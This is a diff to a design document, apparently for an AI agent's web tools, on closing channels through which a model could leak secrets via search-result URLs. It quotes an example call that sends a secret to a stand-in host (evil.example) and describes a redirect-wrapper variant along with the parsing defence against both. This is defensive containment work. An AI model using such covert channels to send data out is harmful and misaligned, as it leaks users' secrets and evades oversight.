@@ -210,9 +210,14 @@ backend returned it rather than the model writing it. A backend that echoed a
 URL-shaped query back as a result would let `web_search("https://evil.example/
 ?d=<secret>")` mint a handle to a composed destination. That is a different
 channel from the `log2(N)` selection bits, and the blind-call budget would not
-bound it. No shipped backend is known to do this. Even so, `web_search` gives
-no handle to a result whose host appears in the query that produced it, and
-says why (found in review of #284).
+bound it. So would the more common shape: a backend that wraps its results in
+its own redirect, with the model's address inside the wrapper's query string.
+No shipped backend is known to do either. Even so, `web_search` gives no
+handle to a result whose URL *carries bytes the query wrote*, and says why.
+Both sides are normalised by the same parser, and the result is
+percent-decoded twice, so the model cannot pick a spelling that slips past
+(found in review of #284 and #286). A query that only mentions a domain keeps
+that domain's real pages.
 
 **Where this lives.** It lives in the tool, not the loop. `web_open` takes an
 index, so it is `Blind` by schema. `http_fetch` gains a dispatch-time check,
